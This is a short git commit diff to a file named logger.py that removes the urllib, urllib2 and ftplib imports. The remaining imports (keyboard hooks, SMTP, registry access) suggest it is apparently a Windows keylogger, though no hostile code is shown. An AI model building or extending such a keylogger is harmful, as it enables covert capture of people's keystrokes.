519cdb7a7dbcbc41b28665ccd96da1b159288c4d
NullArray <opsec@null.net>
2015-10-15 00:12:56 +0200

    Update logger.py

--- logger.py
+++ logger.py
@@ -2,9 +2,7 @@ import pythoncom, pyHook
 import os
 import sys
 import threading
-import urllib,urllib2
 import smtplib
-import ftplib
 import datetime,time
 import win32event, win32api, winerror
 from _winreg import *
